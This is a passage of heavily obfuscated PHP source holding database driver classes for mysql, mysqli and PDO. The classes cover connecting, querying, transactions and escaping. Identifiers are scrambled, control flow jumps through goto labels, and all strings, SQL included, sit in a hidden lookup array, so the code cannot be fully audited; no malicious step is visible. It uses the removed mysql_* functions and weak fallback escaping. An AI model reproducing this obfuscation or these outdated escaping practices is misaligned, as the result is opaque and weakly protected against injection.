think_exception(think_lang($bƒùÜäﬂ‘¥[10]) . $bƒùÜäﬂ‘¥[855]); } if (!empty($dÛÍÎ´â–à)) { $this->config = $dÛÍÎ´â–à; if (empty($this->config[$bƒùÜäﬂ‘¥[13]])) { $this->config[$bƒùÜäﬂ‘¥[13]] = $bƒùÜäﬂ‘¥[33]; } } } public function connect($FÿñÉ‚ﬂ∆À = '', $E∆‡©¥Ó¶≤ = 0, $dü≈◊‚ì•ã = false) { $bùãúπë∆Ï =& $_SERVER[™⁄»üÆ]; if (!isset($this->linkID[$E∆‡©¥Ó¶≤])) { goto fı…ô•Ÿ—£; e†≈ø±ıøã: if (1 != think_config($bùãúπë∆Ï[18])) { unset($this->config); } goto A‘Ò≤èÉ˜ä; d◊àÊ©ßú≤: mysql_query($bùãúπë∆Ï[860] . think_config($bùãúπë∆Ï[861]) . $bùãúπë∆Ï[55], $this->linkID[$E∆‡©¥Ó¶≤]); if ($Eá˜≥Ω…û· > $bùãúπë∆Ï[862]) { mysql_query($bùãúπë∆Ï[863], $this->linkID[$E∆‡©¥Ó¶≤]); } $this->connected = !0; goto e†≈ø±ıøã; fı…ô•Ÿ—£: if (empty($FÿñÉ‚ﬂ∆À)) { $FÿñÉ‚ﬂ∆À = $this->config; } $DÊàΩˆ√Îò = $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[856]] . ($FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[857]] ? "\72{$FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[857]]}" : $bùãúπë∆Ï[33]); $fé‚ä≤ñŸ© = !empty($FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[13]][$bùãúπë∆Ï[14]]) ? $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[13]][$bùãúπë∆Ï[14]] : $this->pconnect; goto b¶àŒã¨›ø; b¶àŒã¨›ø: if ($fé‚ä≤ñŸ©) { $this->linkID[$E∆‡©¥Ó¶≤] = mysql_pconnect($DÊàΩˆ√Îò, $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[858]], $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[859]], 131072); } else { $this->linkID[$E∆‡©¥Ó¶≤] = mysql_connect($DÊàΩˆ√Îò, $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[858]], $FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[859]], !0, 131072); } if (!$this->linkID[$E∆‡©¥Ó¶≤] || !empty($FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[17]]) && !mysql_select_db($FÿñÉ‚ﬂ∆À[$bùãúπë∆Ï[17]], $this->linkID[$E∆‡©¥Ó¶≤])) { think_exception(mysql_error()); } $Eá˜≥Ω…û· = mysql_get_server_info($this->linkID[$E∆‡©¥Ó¶≤]); goto d◊àÊ©ßú≤; A‘Ò≤èÉ˜ä: } return $this->linkID[$E∆‡©¥Ó¶≤]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($dŸ∞éØÖ≤≥) { goto Eºòÿóÿ“–; d§·‚¡≈∞á: think_action_status($A›…¡ä…—Ï[19], 1); think_status($A›…¡ä…—Ï[20]); $this->queryID = mysql_query($dŸ∞éØÖ≤≥, $this->_linkID); goto føè˘∏Ñ™ﬁ; Eºòÿóÿ“–: $A›…¡ä…—Ï =& $_SERVER[™⁄»üÆ]; if (0 === stripos($dŸ∞éØÖ≤≥, $A›…¡ä…—Ï[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÈ´ã‰…£õ; føè˘∏Ñ™ﬁ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto aü£ﬁ›µ†¥; CÈ´ã‰…£õ: if (!$this->_linkID) { return !1; } $this->queryStr = $dŸ∞éØÖ≤≥; if ($this->queryID) { $this->free(); } goto d§·‚¡≈∞á; aü£ﬁ›µ†¥: } public function execute($A˜ÁœﬂàÉÔ) { goto fÓ¨Í∑ıêÖ; fõµÑÈÇ¡: think_status($a≈¢Ù¨“âÙ[20]); $BÉ⁄‹¨•µµ = mysql_query($A˜ÁœﬂàÉÔ, $this->_linkID); $this->debug(); goto e€ô«à÷˜Ø; C¶Œäï˜ÖÏ: $this->queryStr = $A˜ÁœﬂàÉÔ; if ($this->queryID) { $this->free(); } think_action_status($a≈¢Ù¨“âÙ[21], 1); goto fõµÑÈÇ¡; fÓ¨Í∑ıêÖ: $a≈¢Ù¨“âÙ =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C¶Œäï˜ÖÏ; e€ô«à÷˜Ø: if (!1 === $BÉ⁄‹¨•µµ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FìÃ Âéú≤; FìÃ Âéú≤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[™⁄»üÆ][864], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b¥æ∞©á≈Ó = mysql_query($_SERVER[™⁄»üÆ][865], $this->_linkID); $this->transTimes = 0; if (!$b¥æ∞©á≈Ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cà∂¥ì◊É‘ = mysql_query($_SERVER[™⁄»üÆ][866], $this->_linkID); $this->transTimes = 0; if (!$Cà∂¥ì◊É‘) { $this->error(); return !1; } } return !0; } private function getAll() { $C◊Üïúõ—Æ = array(); if ($this->numRows > 0) { while ($CöÏ§£ÿÂ◊ = mysql_fetch_assoc($this->queryID)) { $C◊Üïúõ—Æ[] = $CöÏ§£ÿÂ◊; } mysql_data_seek($this->queryID, 0); } return $C◊Üïúõ—Æ; } public function getFields($Dñâïåé˜ß) { $D€Ü±ú⁄èó =& $_SERVER[™⁄»üÆ]; $e±Ñ‚Í÷–ü = $this->query($D€Ü±ú⁄èó[867] . $this->parseKey($Dñâïåé˜ß)); $cº≠ΩÎàœ = array(); if ($e±Ñ‚Í÷–ü) { foreach ($e±Ñ‚Í÷–ü as $Fòó™¿ÙÌÂ => $eﬁß°Û¿÷¥) { $cº≠ΩÎàœ[$eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[27]]] = array($D€Ü±ú⁄èó[28] => $eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[27]], $D€Ü±ú⁄èó[29] => $eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[30]], $D€Ü±ú⁄èó[31] => (bool) (strtoupper($eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[32]]) === $D€Ü±ú⁄èó[868]), $D€Ü±ú⁄èó[34] => $eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[35]], $D€Ü±ú⁄èó[36] => strtolower($eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[37]]) == $D€Ü±ú⁄èó[38], $D€Ü±ú⁄èó[39] => strtolower($eﬁß°Û¿÷¥[$D€Ü±ú⁄èó[40]]) == $D€Ü±ú⁄èó[41]); } } return $cº≠ΩÎàœ; } public function getTables($CπÜÀ≈≠˘ä = '') { $d∂–ˆÎ«Ñ¿ =& $_SERVER[™⁄»üÆ]; if (!empty($CπÜÀ≈≠˘ä)) { $eùÿ˜Ïﬁ§‚ = $d∂–ˆÎ«Ñ¿[869] . $CπÜÀ≈≠˘ä . $d∂–ˆÎ«Ñ¿[870]; } else { $eùÿ˜Ïﬁ§‚ = $d∂–ˆÎ«Ñ¿[871]; } $aÓ˜ÊØ∏áÇ = $this->query($eùÿ˜Ïﬁ§‚); $A≠¢ô–∏ß¥ = array(); foreach ($aÓ˜ÊØ∏áÇ as $D€∫§ùëè∆ => $føü∂õ¢≥á) { $A≠¢ô–∏ß¥[$D€∫§ùëè∆] = current($føü∂õ¢≥á); } return $A≠¢ô–∏ß¥; } public function replace($b∑øåœ•Ω≈, $Fã’˜Ç∆∫â = array()) { $EøˆìÖ¿ÆÇ =& $_SERVER[™⁄»üÆ]; foreach ($b∑øåœ•Ω≈ as $fï≤ç±©≤å => $C ÏÊÛ∂‹Û) { $F≤˜œäÔñ‹ = $this->parseValue($C ÏÊÛ∂‹Û); if (is_scalar($F≤˜œäÔñ‹)) { $føõÔ¿∂é¡[] = $F≤˜œäÔñ‹; $aÍ¨ªùΩ˘ˆ[] = $this->parseKey($fï≤ç±©≤å); } } $EÉ®ùí˘™« = $EøˆìÖ¿ÆÇ[872] . $this->parseTable($Fã’˜Ç∆∫â[$EøˆìÖ¿ÆÇ[277]]) . $EøˆìÖ¿ÆÇ[873] . implode($EøˆìÖ¿ÆÇ[47], $aÍ¨ªùΩ˘ˆ) . $EøˆìÖ¿ÆÇ[874] . implode($EøˆìÖ¿ÆÇ[47], $føõÔ¿∂é¡) . $EøˆìÖ¿ÆÇ[875]; return $this->execute($EÉ®ùí˘™«); } public function insertAll($E‰∂õ˘ı≤¿, $A¨–∏ª„´‘ = array(), $c∂†“≈ÜŸã = false) { goto F∂’ﬁ≈ãÏ∑; F∂’ﬁ≈ãÏ∑: $d¨œ¡ßï¶ƒ =& $_SERVER[™⁄»üÆ]; if (!is_array($E‰∂õ˘ı≤¿[0])) { return !1; } $c⁄„Òêÿ∫€ = array_keys($E‰∂õ˘ı≤¿[0]); goto cï’ˆÑ¯—Ñ; eÃÛ†øó˘: $E¨ÛòÁ»πç = ($c∂†“≈ÜŸã ? $d¨œ¡ßï¶ƒ[877] : $d¨œ¡ßï¶ƒ[878]) . $d¨œ¡ßï¶ƒ[879] . $this->parseTable($A¨–∏ª„´‘[$d¨œ¡ßï¶ƒ[277]]) . $d¨œ¡ßï¶ƒ[873] . implode($d¨œ¡ßï¶ƒ[47], $c⁄„Òêÿ∫€) . $d¨œ¡ßï¶ƒ[880] . implode($d¨œ¡ßï¶ƒ[47], $c†àﬂ≤©òÛ); return $this->execute($E¨ÛòÁ»πç); goto Bê‰í«¡ã›; cï’ˆÑ¯—Ñ: $c†àﬂ≤©òÛ = array(); foreach ($E‰∂õ˘ı≤¿ as $aãáÛ∫êéù) { $eÆË‰πÖºä = array(); foreach ($aãáÛ∫êéù as $eêâªÉÏâ™ => $eûˆí√È›À) { $eûˆí√È›À = $this->parseValue($eûˆí√È›À); if (is_scalar($eûˆí√È›À)) { $eÆË‰πÖºä[] = $eûˆí√È›À; } } $c†àﬂ≤©òÛ[] = $d¨œ¡ßï¶ƒ[258] . implode($d¨œ¡ßï¶ƒ[47], $eÆË‰πÖºä) . $d¨œ¡ßï¶ƒ[875]; } array_walk($c⁄„Òêÿ∫€, array($this, $d¨œ¡ßï¶ƒ[876])); goto eÃÛ†øó˘; Bê‰í«¡ã›: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $aÏä∏˘ı·¶ =& $_SERVER[™⁄»üÆ]; $this->error = mysql_errno() . $aÏä∏˘ı·¶[4] . mysql_error($this->_linkID); if ($aÏä∏˘ı·¶[33] != $this->queryStr) { $this->error .= LNG($aÏä∏˘ı·¶[45]) . $this->queryStr; } think_trace($this->error, $aÏä∏˘ı·¶[33], $aÏä∏˘ı·¶[46]); return $this->error; } public function escapeString($eâ§®¯¿Ÿ≥) { if ($this->_linkID) { return mysql_real_escape_string($eâ§®¯¿Ÿ≥, $this->_linkID); } else { return mysql_escape_string($eâ§®¯¿Ÿ≥); } } public function parseKey(&$féª¯æ⁄Ø, $E∂ø‡ÿØ±Ç = true) { $AÜÏ⁄˜—“‚ =& $_SERVER[™⁄»üÆ]; if ($E∂ø‡ÿØ±Ç) { $féª¯æ⁄Ø = $this->parseKeyCheck($féª¯æ⁄Ø); } if ($féª¯æ⁄Ø != $AÜÏ⁄˜—“‚[182] && !preg_match($AÜÏ⁄˜—“‚[881], $féª¯æ⁄Ø)) { $féª¯æ⁄Ø = $AÜÏ⁄˜—“‚[382] . trim($féª¯æ⁄Ø, $AÜÏ⁄˜—“‚[382]) . $AÜÏ⁄˜—“‚[382]; } return $féª¯æ⁄Ø; } } class DbMysqli extends Db { public function __construct($bÏŸîêõºÇ = '') { $b˜äÆ‰∂ùƒ =& $_SERVER[™⁄»üÆ]; if (!extension_loaded($b˜äÆ‰∂ùƒ[777])) { think_exception(think_lang($b˜äÆ‰∂ùƒ[10]) . $b˜äÆ‰∂ùƒ[882]); } if (!empty($bÏŸîêõºÇ)) { $this->config = $bÏŸîêõºÇ; if (empty($this->config[$b˜äÆ‰∂ùƒ[13]])) { $this->config[$b˜äÆ‰∂ùƒ[13]] = $b˜äÆ‰∂ùƒ[33]; } } } public function connect($eÚ∆àÚ¶À§ = '', $fÜìÆ∆Ë∞Ê = 0) { $fª§©âåùÚ =& $_SERVER[™⁄»üÆ]; if (!isset($this->linkID[$fÜìÆ∆Ë∞Ê])) { goto eãú™˜’‘Ω; aò‘∫∏¯Òò: $this->connected = !0; if (1 != think_config($fª§©âåùÚ[18])) { unset($this->config); } goto Fë√⁄∫–¬∑; eãú™˜’‘Ω: if (empty($eÚ∆àÚ¶À§)) { $eÚ∆àÚ¶À§ = $this->config; } $this->linkID[$fÜìÆ∆Ë∞Ê] = new mysqli($eÚ∆àÚ¶À§[$fª§©âåùÚ[856]], $eÚ∆àÚ¶À§[$fª§©âåùÚ[858]], $eÚ∆àÚ¶À§[$fª§©âåùÚ[859]], $eÚ∆àÚ¶À§[$fª§©âåùÚ[17]], $eÚ∆àÚ¶À§[$fª§©âåùÚ[857]] ? intval($eÚ∆àÚ¶À§[$fª§©âåùÚ[857]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto e”ﬂÊåΩµ¢; e”ﬂÊåΩµ¢: $bÙÎ™∑•¨° = $this->linkID[$fÜìÆ∆Ë∞Ê]->server_version; $this->linkID[$fÜìÆ∆Ë∞Ê]->query($fª§©âåùÚ[860] . think_config($fª§©âåùÚ[861]) . $fª§©âåùÚ[55]); if ($bÙÎ™∑•¨° > $fª§©âåùÚ[862]) { $this->linkID[$fÜìÆ∆Ë∞Ê]->query($fª§©âåùÚ[863]); } goto aò‘∫∏¯Òò; Fë√⁄∫–¬∑: } return $this->linkID[$fÜìÆ∆Ë∞Ê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bîÙŸπá•õ) { goto Fåıä∫Î‘ê; Fåıä∫Î‘ê: $Dè∂≈ë£ãÒ =& $_SERVER[™⁄»üÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EùÚ¥øæÓæ; EùÚ¥øæÓæ: $this->queryStr = $bîÙŸπá•õ; if ($this->queryID) { $this->free(); } think_action_status($Dè∂≈ë£ãÒ[19], 1); goto A®¢´è†Ãú; Eßé‡Ü∑Ö£: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto eÆ≥˜≥ÆÆß; A®¢´è†Ãú: think_status($Dè∂≈ë£ãÒ[20]); $this->queryID = $this->_linkID->query($bîÙŸπá•õ); if ($this->_linkID->more_results()) { while (($b€„£Èº›» = $this->_linkID->next_result()) != NULL) { $b€„£Èº›»->free_result(); } } goto Eßé‡Ü∑Ö£; eÆ≥˜≥ÆÆß: } public function execute($f‰¥†Ü·‚á) { goto a“ÿÓÁ◊î≠; dˆÖ…œ§∏ú: if (!1 === $a‹ÊÂçƒçÛ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eÌò…ˆ—™Ò; AÉáß•›Æ•: think_status($CŒ•‘ç‚ôé[20]); $a‹ÊÂçƒçÛ = $this->_linkID->query($f‰¥†Ü·‚á); $this->debug(); goto dˆÖ…œ§∏ú; a“ÿÓÁ◊î≠: $CŒ•‘ç‚ôé =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CøƒåÙ—ç≠; CøƒåÙ—ç≠: $this->queryStr = $f‰¥†Ü·‚á; if ($this->queryID) { $this->free(); } think_action_status($CŒ•‘ç‚ôé[21], 1); goto AÉáß•›Æ•; eÌò…ˆ—™Ò: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÓ÷ó∆Ü£œ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dÓ÷ó∆Ü£œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f’óˆêÏœÁ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f’óˆêÏœÁ) { $this->error(); return !1; } } return !0; } private function getAll() { $Aâ°≥¯Í¶í = array(); if ($this->numRows > 0) { for ($aÃÀÉﬂ÷ìª = 0; $aÃÀÉﬂ÷ìª < $this->numRows; $aÃÀÉﬂ÷ìª++) { $Aâ°≥¯Í¶í[$aÃÀÉﬂ÷ìª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Aâ°≥¯Í¶í; } public function getFields($DúÏ‘˘åÏñ) { $D”∑≈¯¥©À =& $_SERVER[™⁄»üÆ]; $dÚÇª¶Æ¶à = $this->query($D”∑≈¯¥©À[867] . $this->parseKey($DúÏ‘˘åÏñ)); $a™å◊èÒè‡ = array(); if ($dÚÇª¶Æ¶à) { foreach ($dÚÇª¶Æ¶à as $C–Üëáä‡„ => $a…µêˆÌﬁ™) { $a™å◊èÒè‡[$a…µêˆÌﬁ™[$D”∑≈¯¥©À[27]]] = array($D”∑≈¯¥©À[28] => $a…µêˆÌﬁ™[$D”∑≈¯¥©À[27]], $D”∑≈¯¥©À[29] => $a…µêˆÌﬁ™[$D”∑≈¯¥©À[30]], $D”∑≈¯¥©À[31] => (bool) ($a…µêˆÌﬁ™[$D”∑≈¯¥©À[32]] === $D”∑≈¯¥©À[33]), $D”∑≈¯¥©À[34] => $a…µêˆÌﬁ™[$D”∑≈¯¥©À[35]], $D”∑≈¯¥©À[36] => strtolower($a…µêˆÌﬁ™[$D”∑≈¯¥©À[37]]) == $D”∑≈¯¥©À[38], $D”∑≈¯¥©À[39] => strtolower($a…µêˆÌﬁ™[$D”∑≈¯¥©À[40]]) == $D”∑≈¯¥©À[41]); } } return $a™å◊èÒè‡; } public function getTables($aºù‚°√√É = '') { $büÒ¡è”äÆ =& $_SERVER[™⁄»üÆ]; $cÔ®ÂËçá† = !empty($aºù‚°√√É) ? $büÒ¡è”äÆ[869] . $aºù‚°√√É . $büÒ¡è”äÆ[870] : $büÒ¡è”äÆ[871]; $D•‰°∏‡’å = $this->query($cÔ®ÂËçá†); $fËÉò´Ûå¿ = array(); if ($D•‰°∏‡’å) { foreach ($D•‰°∏‡’å as $EÍù≈åÓåá => $Cîîœã¡êÃ) { $fËÉò´Ûå¿[$EÍù≈åÓåá] = current($Cîîœã¡êÃ); } } return $fËÉò´Ûå¿; } public function replace($eüª ¢È•‘, $dØßºΩñÈ‚ = array()) { $AÓÍñ–⁄– =& $_SERVER[™⁄»üÆ]; foreach ($eüª ¢È•‘ as $c∫áÁæ–´ã => $D¶ŒØﬂáÛø) { $bâ‰óòáÆ” = $this->parseValue($D¶ŒØﬂáÛø); if (is_scalar($bâ‰óòáÆ”)) { $DπÔ‡âõÿÈ[] = $bâ‰óòáÆ”; $AŒΩ«∆‘…¨[] = $this->parseKey($c∫áÁæ–´ã); } } $bº“∂ëŒ∂ó = $AÓÍñ–⁄–[872] . $this->parseTable($dØßºΩñÈ‚[$AÓÍñ–⁄–[277]]) . $AÓÍñ–⁄–[873] . implode($AÓÍñ–⁄–[47], $AŒΩ«∆‘…¨) . $AÓÍñ–⁄–[874] . implode($AÓÍñ–⁄–[47], $DπÔ‡âõÿÈ) . $AÓÍñ–⁄–[875]; return $this->execute($bº“∂ëŒ∂ó); } public function insertAll($Bâñÿ«…ŸÔ, $a—üˆÙô‹ = array(), $c˜∞ñïÖ‹é = false) { goto cÛ†˘≈è©Í; cÛ†˘≈è©Í: $eê∑Çû•ü™ =& $_SERVER[™⁄»üÆ]; if (!is_array($Bâñÿ«…ŸÔ[0])) { return !1; } $A„ò ûÑœœ = array_keys($Bâñÿ«…ŸÔ[0]); goto D˜˘ΩÏòÎ§; FµÔå“ıç«: $fÍ±©ıÍ–ö = $c˜∞ñïÖ‹é ? $eê∑Çû•ü™[877] : $eê∑Çû•ü™[878]; $f≤óú±¥Ñ∂ = $fÍ±©ıÍ–ö . $eê∑Çû•ü™[879] . $this->parseTable($a—üˆÙô‹[$eê∑Çû•ü™[277]]) . $eê∑Çû•ü™[873] . implode($eê∑Çû•ü™[47], $A„ò ûÑœœ) . $eê∑Çû•ü™[880] . implode($eê∑Çû•ü™[47], $e•ö††≤ª™); return $this->execute($f≤óú±¥Ñ∂); goto D”„øïÜè‚; D˜˘ΩÏòÎ§: $e•ö††≤ª™ = array(); foreach ($Bâñÿ«…ŸÔ as $FëëıÇùóê) { $Aüáª¢ãËä = array(); foreach ($FëëıÇùóê as $D ¨õ¯Â¨ø => $a≈úÇªí»ù) { $a≈úÇªí»ù = $this->parseValue($a≈úÇªí»ù); if (is_scalar($a≈úÇªí»ù)) { $Aüáª¢ãËä[] = $a≈úÇªí»ù; } } $e•ö††≤ª™[] = $eê∑Çû•ü™[258] . implode($eê∑Çû•ü™[47], $Aüáª¢ãËä) . $eê∑Çû•ü™[875]; } array_walk($A„ò ûÑœœ, array($this, $eê∑Çû•ü™[876])); goto FµÔå“ıç«; D”„øïÜè‚: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $aØ´Ãöëêı =& $_SERVER[™⁄»üÆ]; $this->error = $this->_linkID->errno . $aØ´Ãöëêı[4] . $this->_linkID->error; if ($aØ´Ãöëêı[33] != $this->queryStr) { $this->error .= LNG($aØ´Ãöëêı[45]) . $this->queryStr; } think_trace($this->error, $aØ´Ãöëêı[33], $aØ´Ãöëêı[46]); return $this->error; } public function escapeString($E»ÈÌâÑ…◊) { if ($this->_linkID) { return $this->_linkID->real_escape_string($E»ÈÌâÑ…◊); } else { return addslashes($E»ÈÌâÑ…◊); } } public function parseKey(&$bôáîãé≈î, $AˆÜ√Ò“êà = true) { $b–ëãÌîâº =& $_SERVER[™⁄»üÆ]; if ($AˆÜ√Ò“êà) { $bôáîãé≈î = $this->parseKeyCheck($bôáîãé≈î); } if ($bôáîãé≈î != $b–ëãÌîâº[182] && !preg_match($b–ëãÌîâº[881], $bôáîãé≈î)) { $bôáîãé≈î = $b–ëãÌîâº[382] . trim($bôáîãé≈î, $b–ëãÌîâº[382]) . $b–ëãÌîâº[382]; } return $bôáîãé≈î; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($AÀÒÒ•∂ñ˘ = '') { $bãìÏßô∑∏ =& $_SERVER[™⁄»üÆ]; if (!class_exists($bãìÏßô∑∏[883])) { think_exception(think_lang($bãìÏßô∑∏[10]) . $bãìÏßô∑∏[884]); } if (!empty($AÀÒÒ•∂ñ˘)) { $this->config = $AÀÒÒ•∂ñ˘; if (empty($this->config[$bãìÏßô∑∏[13]])) { $this->config[$bãìÏßô∑∏[13]] = array(); } } } public function connect($DëåûÑ÷Ÿâ = '', $dÎÜﬂÁ”Üí = 0) { $A≥ú§˜∏ﬁ∆ =& $_SERVER[™⁄»üÆ]; if (!isset($this->linkID[$dÎÜﬂÁ”Üí])) { goto aöøâç®ˆÀ; dóÑ–’≤ÿ¬: if (!$this->linkID[$dÎÜﬂÁ”Üí]) { think_exception($A≥ú§˜∏ﬁ∆[893]); } try { $this->linkID[$dÎÜﬂÁ”Üí]->exec($A≥ú§˜∏ﬁ∆[894] . think_config($A≥ú§˜∏ﬁ∆[861])); } catch (Exception $a•æ–ÈÌÉÛ) { } $this->connected = !0; goto CÑÚ¥çåÿƒ; aöøâç®ˆÀ: if (empty($DëåûÑ÷Ÿâ)) { $DëåûÑ÷Ÿâ = $this->config; } $CıÆÆΩ·¡ø = !empty($DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[13]][$A≥ú§˜∏ﬁ∆[14]]) ? $DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[13]][$A≥ú§˜∏ﬁ∆[14]] : $this->pconnect; if ($CıÆÆΩ·¡ø) { $DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[13]][PDO::ATTR_PERSISTENT] = !0; } goto aç◊À˘ö•ˆ; aç◊À˘ö•ˆ: try { $this->linkID[$dÎÜﬂÁ”Üí] = new PDO($DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[885]], $DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[858]], $DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[859]], $DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[13]]); } catch (PDOException $a•æ–ÈÌÉÛ) { think_exception($a•æ–ÈÌÉÛ->getMessage()); } $this->dbType = $this->_getDsnType($DëåûÑ÷Ÿâ[$A≥ú§˜∏ﬁ∆[885]]); if (in_array($this->dbType, array($A≥ú§˜∏ﬁ∆[886], $A≥ú§˜∏ﬁ∆[887], $A≥ú§˜∏ﬁ∆[888], $A≥ú§˜∏ﬁ∆[889]))) { think_exception($A≥ú§˜∏ﬁ∆[890] . $this->dbType . $A≥ú§˜∏ﬁ∆[891] . $this->dbType . $A≥ú§˜∏ﬁ∆[892]); } goto dóÑ–’≤ÿ¬; CÑÚ¥çåÿƒ: if (1 != think_config($A≥ú§˜∏ﬁ∆[18])) { unset($this->config); } goto a¥Ú„»®∞≤; a¥Ú„»®∞≤: } return $this->linkID[$dÎÜﬂÁ”Üí]; } public function free() { $this->PDOStatement = null; } public function query($F¥‰Úîìú≤, $F∞áπ∆Ö≈ú = array()) { goto a‰·ﬁÀ¨ê∂; CÊ—âßŸ∂∫: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fâàëÉä≠ƒ = $this->PDOStatement->execute($F∞áπ∆Ö≈ú); $this->debug(); goto eÜöçÉüœ…; CÒÉÖ±Üàƒ: think_action_status($c◊Ù‘¥ ’å[19], 1); think_status($c◊Ù‘¥ ’å[20]); $this->PDOStatement = $this->_linkID->prepare($F¥‰Úîìú≤); goto CÊ—âßŸ∂∫; Fˆ—®¨˜æá: $this->queryStr = $F¥‰Úîìú≤; if (!empty($F∞áπ∆Ö≈ú)) { $this->queryStr .= $c◊Ù‘¥ ’å[895] . print_r($F∞áπ∆Ö≈ú, !0) . $c◊Ù‘¥ ’å[896]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÒÉÖ±Üàƒ; a‰·ﬁÀ¨ê∂: $c◊Ù‘¥ ’å =& $_SERVER[™⁄»üÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fˆ—®¨˜æá; eÜöçÉüœ…: if (!1 === $fâàëÉä≠ƒ) { $this->error(); return !1; } else { return $this->getAll(); } goto f±ÎÜ®Ç¬—; f±ÎÜ®Ç¬—: } public function execute($c√ÃΩåˆò‚, $C€œ†ïûµõ = array()) { goto C∑≤¢©ñ”à; Còìèé›∆á: $this->queryStr = $c√ÃΩåˆò‚; if (!empty($C€œ†ïûµõ)) { $this->queryStr .= $e ¬≥éÎÕì[895] . print_r($C€œ†ïûµõ, !0) . $e ¬≥éÎÕì[896]; } $cÓ∆Ü¬πë› = !1; goto C“ÌªÃ√Çô; C∑≤¢©ñ”à: $e ¬≥éÎÕì =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Còìèé›∆á; C“ÌªÃ√Çô: if ($this->dbType == $e ¬≥éÎÕì[889]) { if (preg_match($e ¬≥éÎÕì[897], $this->queryStr, $D—ƒÍÖÊßË)) { $this->table = think_config($e ¬≥éÎÕì[898]) . str_ireplace(think_config($e ¬≥éÎÕì[899]), $e ¬≥éÎÕì[375], $D—ƒÍÖÊßË[2]); $cÓ∆Ü¬πë› = (bool) $this->query($e ¬≥éÎÕì[900] . strtoupper($this->table) . $e ¬≥éÎÕì[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($e ¬≥éÎÕì[21], 1); goto f∫ò‚Ó≈”´; b ‡ªÕÓ≈â: $Fé’ê◊àúÀ = $this->PDOStatement->execute($C€œ†ïûµõ); $this->debug(); if (!1 === $Fé’ê◊àúÀ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cÓ∆Ü¬πë› || preg_match($e ¬≥éÎÕì[901], $c√ÃΩåˆò‚)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto f„ﬂËä¢ƒé; f∫ò‚Ó≈”´: think_status($e ¬≥éÎÕì[20]); $this->PDOStatement = $this->_linkID->prepare($c√ÃΩåˆò‚); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto b ‡ªÕÓ≈â; f„ﬂËä¢ƒé: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d…√çÖ¿ïì = $this->_linkID->commit(); $this->transTimes = 0; if (!$d…√çÖ¿ïì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bó∏‡’±‚ò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Bó∏‡’±‚ò) { $this->error(); return !1; } } return !0; } private function getAll() { $eÓÌ≤üø‡± = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eÓÌ≤üø‡±); return $eÓÌ≤üø‡±; } public function 